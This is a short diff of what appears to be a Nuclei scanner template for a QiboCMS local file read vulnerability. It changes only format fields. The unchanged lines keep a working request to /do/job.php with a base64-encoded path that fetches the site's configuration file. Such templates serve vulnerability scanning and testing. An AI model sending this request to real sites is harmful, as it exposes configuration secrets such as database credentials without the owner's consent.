@@ -5,10 +5,11 @@ info:
   author: theabhinavgaur
   severity: high
   metadata:
+    max-request: 1
     verified: true
   tags: qibocms,lfr
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8"
